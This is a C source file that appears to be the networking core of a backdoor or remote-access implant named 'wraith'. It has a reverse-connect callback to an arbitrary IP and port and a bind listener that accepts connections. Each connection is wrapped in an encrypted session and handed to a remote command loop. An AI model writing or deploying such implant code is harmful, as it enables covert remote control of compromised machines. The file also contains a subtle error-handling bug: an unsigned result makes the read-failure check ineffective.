#define _GNU_SOURCE
#include <pthread.h>
#include <safe_memset.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <wraith.h>

void
perform_callback(uint32_t ip_addr, uint16_t port)
{
    int sock;
    struct sockaddr_in addr;

    wraith_session_t *session;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    session = calloc(1, sizeof(wraith_session_t));
    session->fd = sock;
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(ip_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) >= 0) {
        extern void s20_session_wrap(wraith_session_t *session, int sock);

        s20_session_wrap(session, sock);

        wraith_cmd_loop(session);
    }
}

void
session_close(wraith_session_t *session)
{
    close(session->fd);
}

void
perform_listen(int indefinite, uint16_t port)
{
    int listener;
    int sock;
    int res;
    fd_set set;
    socklen_t len;
    pthread_t child_thread;
    wraith_session_t *session;

    struct sockaddr_in addr;
    struct timeval timeout;
   
    session = calloc(1, sizeof(wraith_session_t));
    listener = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        ERROR_PRINT("could not bind socket!");
        return;
    }

    if (listen(listener, 1) < 0) {
        ERROR_PRINT("could not listen!");
        return;
    }

    if (indefinite == 0) {
        FD_ZERO(&set);
        FD_SET(listener, &set);

        timeout.tv_sec = 40;
        timeout.tv_usec = 0;

        res = select(listener + 1, &set, NULL, NULL, &timeout);

        if (res <= 0) {
            ERROR_PRINT("timeout waiting for connection");
            return;
        }
    }

    len = sizeof(addr);

    do {
        sock = accept(listener, (struct sockaddr*)&addr, &len);

        DEBUG_PRINT("accepted connection! %d", sock);

        if (sock > 0) {
            session = calloc(1, sizeof(wraith_session_t));
            session->fd = sock;

            extern void s20_session_wrap(wraith_session_t *session, int sock);
            s20_session_wrap(session, sock);

            if (indefinite != 0) {
                pthread_create(&child_thread, NULL,  (void *(*) (void *))wraith_cmd_loop, session);
            } else {
                wraith_cmd_loop(session);
            }
        }
    } while (indefinite != 0);

    close(listener);
}

ssize_t
session_read(wraith_session_t *session, char *buf, size_t nbyte)
{
    if (!session->read_func) {
        ERROR_PRINT("session->read_func not set!");
        return -1;
    }

    return session->read_func(session, buf, nbyte);
}

ssize_t
session_read_all(wraith_session_t *session, char *buf, size_t nbyte)
{
    size_t nread;
    size_t toread;
    size_t res;

    nread = 0;

    while (nread < nbyte) {
        toread = nbyte - nread;
        res = session_read(session, &buf[nread], toread);

        if (res >= 0) {
            nread += res;
        } else {
            return -1;
        }
    }

    return nread;
}

ssize_t
session_write(wraith_session_t *session, const char *buf, size_t nbyte)
{
    if (!session->write_func) {
        ERROR_PRINT("session->write_func not set!");
        return -1;
    }
    
    return session->write_func(session, buf, nbyte);
}